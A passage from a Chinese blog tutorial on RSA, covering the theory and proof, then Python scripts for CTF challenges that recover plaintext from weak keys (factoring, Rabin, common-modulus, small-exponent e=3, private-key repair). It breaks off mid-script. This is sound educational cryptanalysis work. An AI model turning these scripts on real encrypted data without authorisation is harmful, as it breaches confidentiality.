        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="0x00-前期准备"><a href="#0x00-前期准备" class="headerlink" title="0x00 前期准备"></a>0x00 前期准备</h1><h2 id="01-基础知识"><a href="#01-基础知识" class="headerlink" title="01 基础知识"></a>01 基础知识</h2><p>　　<strong>RSA加密算法</strong>是一种<a href="https://zh.wikipedia.org/wiki/非对称加密演算法" target="_blank" rel="noopener">非对称加密算法</a>，在<a href="https://zh.wikipedia.org/wiki/公开密钥加密" target="_blank" rel="noopener">公开密钥加密</a>和<a href="https://zh.wikipedia.org/wiki/电子商业" target="_blank" rel="noopener">电子商业</a>中被广泛使用。RSA是由<a href="https://zh.wikipedia.org/wiki/罗纳德·李维斯特" target="_blank" rel="noopener">罗纳德·李维斯特</a>（Ron Rivest）、<a href="https://zh.wikipedia.org/wiki/阿迪·萨莫尔" target="_blank" rel="noopener">阿迪·萨莫尔</a>（Adi Shamir）和<a href="https://zh.wikipedia.org/wiki/伦纳德·阿德曼" target="_blank" rel="noopener">伦纳德·阿德曼</a>（Leonard Adleman）在1977年一起提出的。当时他们三人都在<a href="https://zh.wikipedia.org/wiki/麻省理工学院" target="_blank" rel="noopener">麻省理工学院</a>工作。RSA 就是他们三人姓氏开头字母拼在一起组成的。</p><h3 id="1-1-安全保证"><a href="#1-1-安全保证" class="headerlink" title="1.1 安全保证"></a>1.1 安全保证</h3><p>安全性依赖于大整数分解的难题：寻找两个不同的大素数是容易的，但将两个大素数的乘积分解成原来的两个素数是极其困难的。  </p><h3 id="1-2-具体内容"><a href="#1-2-具体内容" class="headerlink" title="1.2 具体内容"></a>1.2 具体内容</h3><p>假设Bob想给Alice送一个消息m：</p><ol><li>选择两个大素数 p 和 q ，计算$n=p q$；</li><li>随机选取整数e和 d ，满足$e d \equiv 1(\bmod \varphi(n))$  ，其中$\varphi(n)$ 为 $n$的欧拉函数；（$r = \varphi(n)=\varphi(p) \varphi(q)=(p-1)(q-1)$，选择一个小于 r 的整数 e，使 r 与 e 互质，并求得 e 关于 r 的<a href="https://zh.wikipedia.org/wiki/模反元素" target="_blank" rel="noopener">模逆元</a>，命名为 d 求 $ e d \equiv 1(\bmod r)$。模逆元存在，当且仅当 e 与 r 互质。）</li><li>发布e和 n 为公钥， d 为私钥；  </li><li>设明文为m，加密函数为$c \equiv E(m) \equiv m^{e}(\bmod n)$，其中$1&lt;m, c&lt;n$；</li><li>解密函数为 $m \equiv D(c) \equiv c^{d}(\bmod n)$。</li></ol><p>$(n, e)$ 是公钥, $(n, d)$ 是私钥。Alice将她的公钥$(n, e)$ 传给Bob，而将她的私钥 $(n, d)$ 藏起来。</p><h3 id="1-3-证明"><a href="#1-3-证明" class="headerlink" title="1.3 证明"></a>1.3 证明</h3><p>下面使用欧拉定理证明解密函数的正确性，即已知1-4，证明 5 成立。  </p><p><strong>证明</strong>：由于 $c \equiv m^{e}(\bmod n),$ 所以 $c^{d} \equiv m^{e d}(\bmod n),$ 即证 $m^{e d} \equiv m(\bmod n)$</p><ol><li>当 $(m, n)=1$ 时，由欧拉定理知 $, m^{\varphi(n)} \equiv 1(\bmod n),$ 而由条件2知 $e d \equiv 1(\bmod \varphi(n)),$ 即存<br>在整数 $k ，$ 使得 $e d=k \varphi(n)+1,$ 因此 $, \quad m^{e d} \equiv m^{k \varphi(n)+1} \equiv m(\bmod n)$；</li><li>当 $(m, n) \neq 1$ 时，由于 $n=p q,$ 因此 $(m, n)=p$ 或 $(m, n)=q,$ 即 $p|m$ 或 $q | m$ ，<br>若 $p| m,$ 则显然 $m^{e d} \equiv m^{k \varphi(n)+1} \equiv m \equiv 0(\bmod p)$；<br>若 $p\nmid m,$ 则由欧拉定理知 $m^{p-1} \equiv 1(\bmod p),$ 于是$m^{k \varphi(n)+1} \equiv m^{k(p-1)(q-1)+1} \equiv m(\bmod p)$；<br>因此，对任意$m$，$m^{e d} \equiv m^{k \varphi(n)+1} \equiv m(\bmod p)$ 成立，同理可证，对任意 $m, \quad m^{e d} \equiv m^{k \varphi(n)+1} \equiv m(\bmod q)$ 成立，因此 $m^{e d} \equiv m(\bmod n)$ 成立。(同余性质10-最小公倍数)</li></ol><h3 id="1-4-安全性"><a href="#1-4-安全性" class="headerlink" title="1.4 安全性"></a>1.4 安全性</h3><p>假设偷听者Eve获得了Alice的公钥 $n$ 和 e 以及Bob的加密消息 $c,$ 但她无法直接获得Alice的私钥 $d 。$ 要获得 $d,$ 最简单的方法是将 $n$ 分解为 $p$ 和 $q,$ 这样她可以得到同余方程$d e=1(\bmod (p-1)(q-1))$ 并解出 $d,$ 然后代入解密公式$m\equiv c^{d} (\bmod n)$导出$m$(破密) 。<br>但至今为止还没有人找到一个多项式时间的算法来分解一个大的整数的因子，同时也还没有人能够证明这种算法不存在 (见因数分解)<br>至今为止也没有人能够证明对$n$进行因数分解是唯一的从$c$导出$m$的方法，直到今天也还没有找到比它更简单的方法。（至少没有公开的方法）<br>因此今天一般认为只要$n$足够大，那么黑客就没有办法了。<br>假如$n$的长度小于或等于256位，那么用一台个人电脑在几个小时内就可以分解它的因子了。1999年，数百台电脑合作分解了一个512位长的$n$。一个由Shamir 和Tromer在2003年从理论上构建的硬件TWIRL，使人们开始质疑1024位长的$n$的安全性，目前推荐$n$的长度至少为2048位。<br>1994年<a href="https://zh.wikipedia.org/wiki/彼得·秀爾" target="_blank" rel="noopener">彼得·秀尔</a>（Peter Shor）证明一台<a href="https://zh.wikipedia.org/wiki/量子计算机" target="_blank" rel="noopener">量子计算机</a>可以在多项式时间内进行因数分解。假如量子计算机有朝一日可以成为一种可行的技术的话，那么秀尔的算法可以淘汰RSA和相关的派生算法。（即依赖于分解大整数困难性的加密算法）<br>假如有人能够找到一种有效的分解大整数的算法的话，或者假如量子计算机可行的话，那么在解密和制造更长的钥匙之间就会展开一场竞争。但从原理上来说RSA在这种情况下是不可靠的。</p><h3 id="1-5-参考"><a href="#1-5-参考" class="headerlink" title="1.5 参考"></a>1.5 参考</h3><ul><li>《信息安全数学基础》(主编：常相茂 周玉倩)</li><li><a href="https://zh.wikipedia.org/wiki/RSA%E5%8A%A0%E5%AF%86%E6%BC%94%E7%AE%97%E6%B3%95#%E5%AE%89%E5%85%A8" target="_blank" rel="noopener">维基百科</a></li></ul><h2 id="02-Ubuntu-安装gmpy2模块"><a href="#02-Ubuntu-安装gmpy2模块" class="headerlink" title="02 Ubuntu 安装gmpy2模块"></a>02 Ubuntu 安装gmpy2模块</h2><p>PARI/GP是一个比较强大的数论库，“针对数论中的快速计算（大数分解，代数数论，椭圆曲线…）而设计”。</p><p><strong>需要的依赖库 gmp mpfr mpc</strong></p><h3 id="gmp-库安装"><a href="#gmp-库安装" class="headerlink" title="gmp 库安装"></a>gmp 库安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libgmp-dev</span><br></pre></td></tr></table></figure><h3 id="mpfr-库安装"><a href="#mpfr-库安装" class="headerlink" title="mpfr 库安装"></a>mpfr 库安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libmpfr-dev</span><br></pre></td></tr></table></figure><h3 id="mpc-库安装"><a href="#mpc-库安装" class="headerlink" title="mpc 库安装"></a>mpc 库安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libmpc-dev</span><br></pre></td></tr></table></figure><h3 id="gmpy2-安装"><a href="#gmpy2-安装" class="headerlink" title="gmpy2 安装"></a>gmpy2 安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python3</span></span><br><span class="line">sudo pip3 install gmpy2</span><br><span class="line"><span class="comment">#python2</span></span><br><span class="line">sudo pip install gmpy2</span><br></pre></td></tr></table></figure><hr><h1 id="0x01-已知n、e、c，求m"><a href="#0x01-已知n、e、c，求m" class="headerlink" title="0x01 已知n、e、c，求m"></a>0x01 已知n、e、c，求m</h1><h2 id="01-思路"><a href="#01-思路" class="headerlink" title="01 思路"></a>01 思路</h2><ol><li>利用 <a href="http://factordb.com/" target="_blank" rel="noopener">http://factordb.com/</a> 分解n获得p和q；</li><li>计算d；</li><li>解密得明文m。</li></ol><h2 id="02-代码"><a href="#02-代码" class="headerlink" title="02 代码"></a>02 代码</h2><ul><li><strong>代码1</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long,getPrime,isPrime</span><br><span class="line"><span class="keyword">import</span> primefac</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> primefac.modinv(a, n) % n</span><br><span class="line">n = ...</span><br><span class="line">e = ...</span><br><span class="line">c = ...</span><br><span class="line">p = ...</span><br><span class="line">q = ...</span><br><span class="line"></span><br><span class="line">phi_n = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = modinv(e, phi_n) % phi_n <span class="comment">#求模逆元</span></span><br><span class="line">m = pow(c, d, n) <span class="comment">#求明文</span></span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure><ul><li><strong>代码2</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="comment">#分解n得p,q</span></span><br><span class="line">p = gmpy2.mpz(...) <span class="comment">#填写p</span></span><br><span class="line">q = gmpy2.mpz(...) <span class="comment">#填写q</span></span><br><span class="line">e = gmpy2.mpz(...) <span class="comment">#填写e</span></span><br><span class="line">c = gmpy2.mpz(...) <span class="comment">#填写c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#计算d</span></span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi_n) <span class="comment">#求解模逆元</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"private key:"</span></span><br><span class="line"><span class="keyword">print</span> d</span><br><span class="line"></span><br><span class="line"><span class="comment">#求明文</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"plaintext:"</span></span><br><span class="line">M  =  pow(c, d, p*q)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[10进制]: '</span> + str(M)</span><br><span class="line">flag = str( hex(M) )[<span class="number">2</span>:] <span class="comment">#[2:-1]</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[16进制]: '</span> + flag</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[ASCII码]: '</span> + flag.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><hr><h1 id="0x02-低加密指数分解攻击-e-1"><a href="#0x02-低加密指数分解攻击-e-1" class="headerlink" title="0x02 低加密指数分解攻击(e = 1)"></a>0x02 低加密指数分解攻击(e = 1)</h1><h2 id="01-思路-1"><a href="#01-思路-1" class="headerlink" title="01 思路"></a>01 思路</h2><ol><li>加密过程：$c \equiv E(m) \equiv m^{e}(\bmod n) \equiv m(\bmod n)$，所以明文与密文模n同余；</li><li>$m = c + n*k (k=0,1,2,3…)$，暴力破解即可。</li></ol><h2 id="02-代码-1"><a href="#02-代码-1" class="headerlink" title="02 代码"></a>02 代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n = ... <span class="comment">#填写n</span></span><br><span class="line">c = ... <span class="comment">#填写c</span></span><br><span class="line"></span><br><span class="line">max_num = <span class="number">6</span> <span class="comment">#遍历上限</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range( max_num ):</span><br><span class="line">    m = c + n*k</span><br><span class="line">    <span class="keyword">print</span> libnum.n2s(m)</span><br></pre></td></tr></table></figure><hr><h1 id="0x03-Rabin加密-e-2"><a href="#0x03-Rabin加密-e-2" class="headerlink" title="0x03 Rabin加密(e=2)"></a>0x03 Rabin加密(e=2)</h1><h2 id="01-思路-2"><a href="#01-思路-2" class="headerlink" title="01 思路"></a>01 思路</h2><p>理论知识：<a href="http://dragonliu.tk/2020/07/08/Rabin加密/" target="_blank" rel="noopener">我跳</a></p><h2 id="02-代码-2"><a href="#02-代码-2" class="headerlink" title="02 代码"></a>02 代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="comment">#从文件中读取密文</span></span><br><span class="line">f = open(<span class="string">'flag.enc'</span>,<span class="string">'r'</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">c = libnum.s2n(c)<span class="comment">#字符串转数字</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#分解n</span></span><br><span class="line">p = ... <span class="comment">#填写p</span></span><br><span class="line">q = ... <span class="comment">#填写p</span></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line"><span class="comment">#求解mp与mq</span></span><br><span class="line">mp = pow(c, (p+<span class="number">1</span>)/<span class="number">4</span>, p)</span><br><span class="line">mq = pow(c, (q+<span class="number">1</span>)/<span class="number">4</span>, q)</span><br><span class="line"></span><br><span class="line"><span class="comment">#求解yp与yq</span></span><br><span class="line">yp = gmpy2.invert(p, q)</span><br><span class="line">yq = gmpy2.invert(q, p)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获得四个解</span></span><br><span class="line">r1 = (yp*p*mq + yq*q*mp) % n</span><br><span class="line">r2 = (-r1) % n</span><br><span class="line">r3 = (yp*p*mq - yq*q*mp) % n</span><br><span class="line">r4 = (-r3) % n</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> libnum.n2s( r1 )<span class="comment">#数字转字符串</span></span><br><span class="line"><span class="keyword">print</span> libnum.n2s( r2 )</span><br><span class="line"><span class="keyword">print</span> libnum.n2s( r3 )</span><br><span class="line"><span class="keyword">print</span> libnum.n2s( r4 )</span><br></pre></td></tr></table></figure><p>当$p = q$时，使用python命令行将16进制转十进制，然后直接求解$c$模 n 时的平方根：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n = ...;</span><br><span class="line">c = ...;</span><br><span class="line"><span class="keyword">PowerMod</span>[c, <span class="number">1</span>/<span class="number">2</span>, n]</span><br></pre></td></tr></table></figure><p>Wolfram 语言在线编辑：<a href="https://www.wolframcloud.com/" target="_blank" rel="noopener">我跳</a></p><hr><h1 id="0x04-flag-enc-pubkey-pem"><a href="#0x04-flag-enc-pubkey-pem" class="headerlink" title="0x04 flag.enc + pubkey.pem"></a>0x04 flag.enc + pubkey.pem</h1><h2 id="01-思路-3"><a href="#01-思路-3" class="headerlink" title="01 思路"></a>01 思路</h2><ol><li>解压得到两个文件【flag.enc】和【pubkey.pem】，其中【flag.enc】从文件名含有flag可以判断是加密后的密文，【pubkey.pem】是公钥文件，通过公钥文件可以得到e和n；</li><li>通过openssl对公钥文件【pubkey.pem】进行分解，使用命令【openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem】，得到 e【Exponent】和 n【Modulus】；</li><li>其他根据类型判断。</li></ol><h2 id="02-代码-3"><a href="#02-代码-3" class="headerlink" title="02 代码"></a>02 代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line"><span class="comment">#分解n得p,q</span></span><br><span class="line">n = ... <span class="comment">#填写n</span></span><br><span class="line">p = ... <span class="comment">#填写p</span></span><br><span class="line">q = ... <span class="comment">#填写q</span></span><br><span class="line">e = ... <span class="comment">#填写e</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#计算私钥</span></span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = int( gmpy2.invert(e, phi_n) ) <span class="comment">#求解模逆元</span></span><br><span class="line">privatekey = rsa.PrivateKey(n , e , d , p , q) <span class="comment">#根据已知参数，计算私钥</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"./flag.enc"</span> , <span class="string">"rb"</span>) <span class="keyword">as</span> f: <span class="comment">#填写文件</span></span><br><span class="line">    <span class="keyword">print</span> rsa.decrypt(f.read(), privatekey).decode()  <span class="comment">#使用私钥对密文进行解密，并打印</span></span><br></pre></td></tr></table></figure><hr><h1 id="0x05-共模攻击"><a href="#0x05-共模攻击" class="headerlink" title="0x05 共模攻击"></a>0x05 共模攻击</h1><h2 id="01-思路-4"><a href="#01-思路-4" class="headerlink" title="01 思路"></a>01 思路</h2><p>用相同的N，不同的e进行加密的，可以使用共模攻击。</p><h2 id="02-代码-4"><a href="#02-代码-4" class="headerlink" title="02 代码"></a>02 代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s, s2n</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert, gcdext</span><br><span class="line"></span><br><span class="line">n  = ... <span class="comment">#填写n</span></span><br><span class="line">e1 = ... <span class="comment">#填写e1</span></span><br><span class="line">e2 = ... <span class="comment">#填写e2</span></span><br><span class="line"></span><br><span class="line">s = gcdext(e1, e2)  </span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = -s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取密文</span></span><br><span class="line">file1 = open(<span class="string">'flag.enc1'</span>, <span class="string">'r'</span>)</span><br><span class="line">c1 = file1.read()</span><br><span class="line">c1 = s2n(c1)<span class="comment">#字符串转数字</span></span><br><span class="line"></span><br><span class="line">file2 = open(<span class="string">'flag.enc2'</span>, <span class="string">'r'</span>)</span><br><span class="line">c2 = file2.read()</span><br><span class="line">c2 = s2n(c2)<span class="comment">#字符串转数字</span></span><br><span class="line"></span><br><span class="line">c2 = invert(c2, n)   </span><br><span class="line">m = (pow(c1,s1,n) * pow(c2 , s2 , n)) % n</span><br><span class="line"><span class="keyword">print</span> n2s(m)</span><br></pre></td></tr></table></figure><hr><h1 id="0x06-低加密指数分解攻击-e-3"><a href="#0x06-低加密指数分解攻击-e-3" class="headerlink" title="0x06 低加密指数分解攻击(e = 3)"></a>0x06 低加密指数分解攻击(e = 3)</h1><h2 id="01-思路-5"><a href="#01-思路-5" class="headerlink" title="01 思路"></a>01 思路</h2><ol><li>公钥中，e=3，N非常大。</li><li>加密过程：$c \equiv E(m) \equiv m^{e}(\bmod n) \equiv m^3(\bmod n)$，所以明文与密文的3次方模n同余；</li><li>$m = c + n*k (k=0,1,2,3…)$，然后开三次方，暴力破解即可。</li></ol><h2 id="02-代码-5"><a href="#02-代码-5" class="headerlink" title="02 代码"></a>02 代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> s2n, n2s</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"></span><br><span class="line">n = ... <span class="comment">#填写n</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#读取密文</span></span><br><span class="line">file = open(<span class="string">'flag.enc'</span>, <span class="string">'r'</span>)</span><br><span class="line">c = file.read()</span><br><span class="line">c = s2n(c)<span class="comment">#字符串转数字</span></span><br><span class="line">file.close()</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    res = iroot( (c + i*n), <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">if</span>( res[<span class="number">1</span>] ==  <span class="literal">True</span>):</span><br><span class="line">        <span class="keyword">print</span> res</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"i = "</span> + str(i)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">m = ... <span class="comment">#暴力获得的m</span></span><br><span class="line"><span class="keyword">print</span> n2s(m)</span><br></pre></td></tr></table></figure><hr><h1 id="0x07-私钥修复-最优非对称加密填充-God-Like-RSA"><a href="#0x07-私钥修复-最优非对称加密填充-God-Like-RSA" class="headerlink" title="0x07 私钥修复+最优非对称加密填充(God Like RSA)"></a>0x07 私钥修复+最优非对称加密填充(God Like RSA)</h1><h2 id="01-思路-6"><a href="#01-思路-6" class="headerlink" title="01 思路"></a>01 思路</h2><p>压缩包里有一个密文，一个部分缺失的私钥，一个公钥，读公钥可知 N 是 4096 位的，分解无望，肯定要从私钥着手。</p><ol><li>【vscode】打开【private.corrupted】，将对应变量填入下列脚本；</li><li>执行脚本后得到私钥，新建文件【private.pem】并将私钥复制进去；</li><li>然后执行【最优非对称加密填充】脚本。</li></ol><h2 id="02-代码-6"><a href="#02-代码-6" class="headerlink" title="02 代码"></a>02 代码</h2><p><strong>私钥修复脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> invmod, gcd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_linear</span><span class="params">(a, b, mod)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a &amp; <span class="number">1</span> == <span class="number">0</span> <span class="keyword">or</span> b &amp; <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> (b * 